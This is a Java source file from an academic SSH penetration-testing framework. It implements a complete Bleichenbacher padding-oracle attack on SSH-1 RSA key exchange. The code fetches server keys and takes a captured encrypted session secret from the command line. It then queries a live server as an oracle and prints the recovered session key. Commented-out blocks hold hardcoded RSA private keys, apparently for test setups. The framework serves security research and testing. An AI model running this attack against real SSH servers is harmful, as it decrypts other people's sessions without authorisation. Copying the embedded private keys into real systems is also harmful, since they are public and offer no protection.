/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.impl;

import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;

import com.google.common.primitives.Bytes;
import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
import de.rub.nds.sshattacker.attacks.general.ParallelExecutor;
import de.rub.nds.sshattacker.attacks.pkcs1.*;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.BleichenbacherOracle;
import de.rub.nds.sshattacker.attacks.response.EqualityError;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
import de.rub.nds.sshattacker.core.crypto.cipher.AbstractCipher;
import de.rub.nds.sshattacker.core.crypto.cipher.CipherFactory;
import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
import de.rub.nds.sshattacker.core.exceptions.CryptoException;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPublicKey;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Sends differently formatted PKCS#1 v2.x messages to the SSH server and observes the server
 * responses. In case there are differences in the server responses, it is very likely that it is
 * possible to execute Manger's attack.
 */
public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger();

    private final Config sshConfig;
    private EqualityError resultError;

    private KeyExchangeAlgorithm keyExchangeAlgorithm;

    private final List<CustomRsaPublicKey> publicKeys = new ArrayList<>();
    private CustomRsaPublicKey serverPublicKey, hostPublicKey;

    private final int counterInnerBleichenbacher;
    private final int counterOuterBleichenbacher;

    /**
     * @param bleichenbacherConfig Manger attack config
     * @param baseConfig Base config
     */
    public BleichenbacherAttacker(
            BleichenbacherCommandConfig bleichenbacherConfig, Config baseConfig) {
        this(bleichenbacherConfig, baseConfig, new ParallelExecutor(1, 3));
    }

    /**
     * @param bleichenbacherCommandConfig Manger attack config
     * @param baseConfig Base config
     * @param executor Executor
     */
    public BleichenbacherAttacker(
            BleichenbacherCommandConfig bleichenbacherCommandConfig,
            Config baseConfig,
            ParallelExecutor executor) {
        super(bleichenbacherCommandConfig, baseConfig);
        sshConfig = getSshConfig();
        this.counterInnerBleichenbacher = 0;
        this.counterOuterBleichenbacher = 0;
    }

    /**
     * Returns True, if the Sever is vulnerabily to Bleichenbacher`s attack, not implemented yet
     * because of missing tests.
     *
     * @return If the server is vulnerable to Bleichenbacher's attack or not
     */
    @Override
    public Boolean isVulnerable() {
        return hasOracle();
    }

    /**
     * Checks if the server has Bleichenbacher's oracle, is not implemented yed because of missing
     * testcase.
     *
     * @return If the server has Bleichenbacher's oracle or not
     */
    public boolean hasOracle() {
        return true;
    }

    /**
     * Fetches the transient public key from a key exchange. Note that multiple calls to this method
     * when connected to the same server can yield different keys.
     *
     * @return Transient public key
     */
    private RSAPublicKey getServerPublicKey() {
        if (serverPublicKey == null) {
            if (publicKeys.isEmpty()) {
                getPublicKeys();
                serverPublicKey = publicKeys.get(0);
            } else {
                serverPublicKey = publicKeys.get(0);
            }
        }
        return serverPublicKey;
    }

    private RSAPublicKey getHostPublicKey() {
        if (hostPublicKey == null) {
            if (publicKeys.isEmpty()) {
                getPublicKeys();
                hostPublicKey = publicKeys.get(1);
            } else {
                hostPublicKey = publicKeys.get(1);
            }
        }
        return hostPublicKey;
    }

    private void getPublicKeys() {
        List<CustomRsaPublicKey> fetchedRsaSsh1Keys = KeyFetcher.fetchRsaSsh1Keys(sshConfig);
        if (fetchedRsaSsh1Keys.isEmpty()) {
            LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
            return;
        }
        publicKeys.clear();
        publicKeys.addAll(fetchedRsaSsh1Keys);
        LOGGER.info("Recived keys");
    }

    @Override
    public void executeAttack() {

        if (config.isBenchmark()) {
            try {
                String str = "Starting.";
                File output_File = new File("benchmark_results.txt");
                FileOutputStream outputStream = new FileOutputStream(output_File, true);
                byte[] strToBytes = str.getBytes();
                outputStream.write(strToBytes);

                outputStream.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        /*// Host 2048
        CustomRsaPrivateKey hostPrivatKey =
                new CustomRsaPrivateKey(
                        new BigInteger(
                                "7AAB5898AEE7C451A2A90B9DE04EC947656FAB69460FF68E1E278EA1841D"
                                        + "A22B39CA4A4FA7CEA1B8EDCB7224C38A1659D1226D2E07AF9A7C62A305AC"
                                        + "9DEC042FBC290443B23E24C64765DE1AD58777A522BF102B1BCC5536D794"
                                        + "62BCBE6DB8E91CD9CF6F98F62E5031BFAA9E51C93ED900579A39C26CBB64"
                                        + "CF7E6F998513E20B4B2A4DD36D4F6F074A0FDB04232FA6EDAB89A1B32BA5"
                                        + "2214696BDA66C4518A73F92807DD088AB11263519885A0CD6A42B6D9EAE9"
                                        + "EBD13241EDC4EB7205AE838A5EF7AE280D36410057B38ED05CEBA75F92AC"
                                        + "DF40226164BB3A0C4312B65A8C2FBA85CDB7CC5F77F53C45F64409AFC460"
                                        + "210C8EE4DAB818F009172387ED00E141",
                                16),
                        new BigInteger(
                                "00D9F6BFFAB8BC79C6E9AB6C3D4593F561CC93B41A70B9A750045ED0AC09"
                                        + "6EF4A6A8C7B2AAA4F44459481319AE956934BF9D5C5AD7C004ADE0B81E43"
                                        + "75FD1DF8797DF6F3CA130ED8A2A9B6E94467A05D97A0F8380A4CBB75FC5E"
                                        + "5C303433B61750063D3801D5C90658ACAEE140B09F95A0FD8886EFAE16EA"
                                        + "B779DF82E6A12C1BE011FECB417C788B72C42948AB54CCE1E8119CFB78E1"
                                        + "3B06090CEBF6D3806854FE09F03B20BA92505058EC64C44F0B4DA0BAE71D"
                                        + "52EDA11AB67F4B54D9FCEFE1FACEB520D595FFA33502FB91423EBD972F26"
                                        + "150715CB0E648F715E6E5E8FC9D8FA55E9DE0652CF85D7928B235486F54A"
                                        + "3F3EE64B04888B898864B08200A9E22909",
                                16));
        CustomRsaPublicKey hostPublicKey =
                new CustomRsaPublicKey(
                        new BigInteger("010001", 16),
                        new BigInteger(
                                "00D9F6BFFAB8BC79C6E9AB6C3D4593F561CC93B41A70B9A750045ED0AC09"
                                        + "6EF4A6A8C7B2AAA4F44459481319AE956934BF9D5C5AD7C004ADE0B81E43"
                                        + "75FD1DF8797DF6F3CA130ED8A2A9B6E94467A05D97A0F8380A4CBB75FC5E"
                                        + "5C303433B61750063D3801D5C90658ACAEE140B09F95A0FD8886EFAE16EA"
                                        + "B779DF82E6A12C1BE011FECB417C788B72C42948AB54CCE1E8119CFB78E1"
                                        + "3B06090CEBF6D3806854FE09F03B20BA92505058EC64C44F0B4DA0BAE71D"
                                        + "52EDA11AB67F4B54D9FCEFE1FACEB520D595FFA33502FB91423EBD972F26"
                                        + "150715CB0E648F715E6E5E8FC9D8FA55E9DE0652CF85D7928B235486F54A"
                                        + "3F3EE64B04888B898864B08200A9E22909",
                                16));
        // Server 1024
        CustomRsaPrivateKey serverPrivateKey =
                new CustomRsaPrivateKey(
                        new BigInteger(
                                "64F3D28624C63EC5E0A9751FDC4B2D"
                                        + "ADC715F0DDA9D49EF91B4C5AA03483"
                                        + "570BA8AA01151B704335A3219E7D22"
                                        + "2FDB9777DA68F8DF8B5CDB5DB9B0C3"
                                        + "99CF0334044E6ED09B40E754809429"
                                        + "F6C387B7AC7BA00ECFE7AFE4D41499"
                                        + "B2F341FBB0496C52CBE5EB1F7E64F4"
                                        + "BF21F72B64EE0B478EAB6A0008E07A"
                                        + "E2F52960703D0EB9",
                                16),
                        new BigInteger(
                                "00C25E6978A2B8FE2C6228024BD5D0"
                                        + "F3239DDDDECCDF156AEF9D3F7F56AF"
                                        + "8443C510A03C66779363C33082D04D"
                                        + "23648B308AE0BE07A1451C8BFF0B97"
                                        + "DCA43E5703D66B8C04BF46DDBC79A7"
                                        + "7228179E5B246433098BF8271CCE66"
                                        + "C5E4CB3A9E2ECEE52BB07C33F92893"
                                        + "A5D5B6F163BE6FBC1E8E66E4666866"
                                        + "871890105EFFE1193F",
                                16));
        CustomRsaPublicKey serverPublicKey =
                new CustomRsaPublicKey(
                        new BigInteger("010001", 16),
                        new BigInteger(
                                "00C25E6978A2B8FE2C6228024BD5D0"
                                        + "F3239DDDDECCDF156AEF9D3F7F56AF"
                                        + "8443C510A03C66779363C33082D04D"
                                        + "23648B308AE0BE07A1451C8BFF0B97"
                                        + "DCA43E5703D66B8C04BF46DDBC79A7"
                                        + "7228179E5B246433098BF8271CCE66"
                                        + "C5E4CB3A9E2ECEE52BB07C33F92893"
                                        + "A5D5B6F163BE6FBC1E8E66E4666866"
                                        + "871890105EFFE1193F",
                                16));*/

        /*// Host 1024
        CustomRsaPublicKey hostPublicKey =
                new CustomRsaPublicKey(
                        new BigInteger("010001", 16),
                        new BigInteger(
                                "00C6D5D18B3BDCA91AE922941730D7"
                                        + "BFF6F959CACC67609C571CA281148B"
                                        + "97F8CA742B85E9FABAF308E6BFED40"
                                        + "06B639159E19CCCD3FFF4374E905B3"
                                        + "D4FEE6B3F8867940FDAD622FF59E7E"
                                        + "8E7801C29D5BEB6004E1F127C1B37B"
                                        + "5BEDFF057F06FB133A21DA77B2B9FA"
                                        + "9E4CF72740F0049B30DC1CE23EB2B7"
                                        + "E6E92B129E1EFE67E3",
                                16));
        CustomRsaPrivateKey hostPrivatKey =
                new CustomRsaPrivateKey(
                        new BigInteger(
                                "0092FAA9AC0FB31CBA0CCE07C460D1"
                                        + "8B5088A02C7E0E88E6E8A9FD2207CA"
                                        + "ECAAF7150ABB31EBAAD84EA32C0AB7"
                                        + "C27E5F1230CD878BCD9BE7047BE040"
                                        + "3FD9B13624D9C822AB17C96615BB5A"
                                        + "875D1A076D282B2E9035FAC37DB066"
                                        + "82C8498BA624C77B0E1E2ECBE7AB5A"
                                        + "5A0342E20C54482D149A7F37F8EF4A"
                                        + "2C148CD3ADD6782189",
                                16),
                        new BigInteger(
                                "00C6D5D18B3BDCA91AE922941730D7"
                                        + "BFF6F959CACC67609C571CA281148B"
                                        + "97F8CA742B85E9FABAF308E6BFED40"
                                        + "06B639159E19CCCD3FFF4374E905B3"
                                        + "D4FEE6B3F8867940FDAD622FF59E7E"
                                        + "8E7801C29D5BEB6004E1F127C1B37B"
                                        + "5BEDFF057F06FB133A21DA77B2B9FA"
                                        + "9E4CF72740F0049B30DC1CE23EB2B7"
                                        + "E6E92B129E1EFE67E3",
                                16));
        // Server 768 Bit
        CustomRsaPublicKey serverPublicKey =
                new CustomRsaPublicKey(
                        new BigInteger("010001", 16),
                        new BigInteger(
                                "00CB2C65943BB603C0072D4C5AFD8B"
                                        + "C5155D57231F02D191A079A3758BCF"
                                        + "96E83318F0729D05437B543088D8A1"
                                        + "73675EE40E7506EFB09EDD62C868C5"
                                        + "27DB0768AB643AD09A7C42C6AD47DA"
                                        + "ACE6CD53C051E26E69AF472D0CFE17"
                                        + "322EC96499E529",
                                16));
        CustomRsaPrivateKey serverPrivateKey =
                new CustomRsaPrivateKey(
                        new BigInteger(
                                "00B30F82CADCC13296E7FC5D420819"
                                        + "49EDE560A99C68208906F48D4248A1"
                                        + "00EFCE30D9A1398FED04619390D7D3"
                                        + "9AE0ECB7DFB6A5EC8CA6A491097680"
                                        + "9280CB64AF1F8C8B67739CF7093B34"
                                        + "4343419647B331CD9827953279BE6C"
                                        + "AC31C55BA6EF01",
                                16),
                        new BigInteger(
                                "00CB2C65943BB603C0072D4C5AFD8B"
                                        + "C5155D57231F02D191A079A3758BCF"
                                        + "96E83318F0729D05437B543088D8A1"
                                        + "73675EE40E7506EFB09EDD62C868C5"
                                        + "27DB0768AB643AD09A7C42C6AD47DA"
                                        + "ACE6CD53C051E26E69AF472D0CFE17"
                                        + "322EC96499E529",
                                16));*/
        /*if (!isVulnerable()) {
            LOGGER.warn("The server is not vulnerable to Manger's attack");
            return;
        }*/

        getPublicKeys();
        getHostPublicKey();
        getServerPublicKey();
        byte[] encryptedSecret;
        if (config.isBenchmark()) {
            LOGGER.info("Running in Benchmark Mode, generating encrypted Session Key");

            Random random = new Random();
            byte[] sessionKey = new byte[32];
            random.nextBytes(sessionKey);

            AbstractCipher innerEncryption;
            AbstractCipher outerEncryption;
            if (hostPublicKey.getModulus().bitLength() < serverPublicKey.getModulus().bitLength()) {
                innerEncryption = CipherFactory.getRsaPkcs1Cipher(hostPublicKey);
                outerEncryption = CipherFactory.getRsaPkcs1Cipher(serverPublicKey);
            } else {
                innerEncryption = CipherFactory.getRsaPkcs1Cipher(serverPublicKey);
                outerEncryption = CipherFactory.getRsaPkcs1Cipher(hostPublicKey);
            }

            try {
                sessionKey = innerEncryption.encrypt(sessionKey);
                encryptedSecret = outerEncryption.encrypt(sessionKey);
            } catch (CryptoException e) {
                throw new RuntimeException(e);
            }
        } else {
            LOGGER.info("Running in Live Mode, reading encrypted secret from commandline");
            if (config.getEncryptedSecret() == null) {
                throw new ConfigurationException(
                        "The encrypted secret must be set to be decrypted.");
            }
            encryptedSecret = ArrayConverter.hexStringToByteArray(config.getEncryptedSecret());
        }

        if ((encryptedSecret.length * Byte.SIZE) != hostPublicKey.getModulus().bitLength()) {
            throw new ConfigurationException(
                    "The length of the encrypted secret "
                            + "is not equal to the public key length. Have you selected the correct value?");
        }

        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }

        /*        Ssh1MockOracle oracle = null;
        try {
            oracle =
                    new Ssh1MockOracle(
                            hostPublicKey, hostPrivatKey, serverPublicKey, serverPrivateKey);
        } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException e) {
            throw new RuntimeException(e);
        }*/

        BleichenbacherOracle oracle =
                new BleichenbacherOracle(
                        this.hostPublicKey,
                        this.serverPublicKey,
                        getSshConfig(),
                        counterInnerBleichenbacher,
                        counterOuterBleichenbacher);

        Bleichenbacher attacker =
                new Bleichenbacher(encryptedSecret, oracle, hostPublicKey, serverPublicKey);

        long start = System.currentTimeMillis();
        LOGGER.info("Encrypted Secret: {}", ArrayConverter.bytesToHexString(encryptedSecret));

        attacker.attack();

        long finish = System.currentTimeMillis();
        long timeElapsed = finish - start;
        LOGGER.info("The attack took {} milliseconds", timeElapsed);
        LOGGER.info(
                "It took {} tries for the inner and {} tries for the outer Bleichenbacher-Attack",
                attacker.getCounterInnerBleichenbacher(),
                attacker.getCounterOuterBleichenbacher());
        BigInteger solution = attacker.getSolution();

        byte[] solutionByteArray = ArrayConverter.bigIntegerToByteArray(solution);

        CONSOLE.info("Decoded Solution: " + ArrayConverter.bytesToHexString(solutionByteArray));

        if (config.getCookie() != null) {
            byte[] cookieBytes = config.getCookie().getBytes();
            byte[] sessionID = calculateSessionID(cookieBytes);
            int i = 0;
            for (byte sesseionByte : sessionID) {
                solutionByteArray[i] = (byte) (sesseionByte ^ solutionByteArray[i++]);
            }
        }

        if (config.isBenchmark()) {
            try {
                String str =
                        String.format(
                                "{"
                                        + "  \"Plaintext\": \"%s\","
                                        + "  \"Ciphertext\": \"%s\","
                                        + "  \"Time\": \"%d\",\n"
                                        + "  \"Inner-Tries\": \"%d\","
                                        + "  \"Outer-Tries\": \"%d\","
                                        + "  \"serverkey_lenght\": \"%d\","
                                        + "  \"hostkey_lenght\": \"%d\","
                                        + "  \"oracle_type\": \"real\""
                                        + "}",
                                ArrayConverter.bytesToHexString(solutionByteArray),
                                ArrayConverter.bytesToHexString(encryptedSecret),
                                timeElapsed,
                                attacker.getCounterInnerBleichenbacher(),
                                attacker.getCounterOuterBleichenbacher(),
                                serverPublicKey.getModulus().bitLength(),
                                hostPublicKey.getModulus().bitLength());
                File output_File = new File("benchmark_results.txt");
                FileOutputStream outputStream = new FileOutputStream(output_File, true);
                byte[] strToBytes = str.getBytes();
                outputStream.write(strToBytes);

                outputStream.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }

    private byte[] calculateSessionID(byte[] cookie) {
        byte[] serverModulus;
        byte[] hostModulus;

        serverModulus = serverPublicKey.getModulus().toByteArray();
        hostModulus = hostPublicKey.getModulus().toByteArray();

        // Remove sign-byte if present
        if (hostModulus[0] == 0) {
            hostModulus = Arrays.copyOfRange(hostModulus, 1, hostModulus.length);
        }
        if (serverModulus[0] == 0) {
            serverModulus = Arrays.copyOfRange(serverModulus, 1, serverModulus.length);
        }

        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance("MD5");
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
        md.update(Bytes.concat(hostModulus, serverModulus, cookie));
        // md.update(Bytes.concat(serverModulus, hostModulus, cookie));
        byte[] sessionID = md.digest();
        LOGGER.debug("Session-ID {}", ArrayConverter.bytesToHexString(sessionID));

        return sessionID;
    }
}
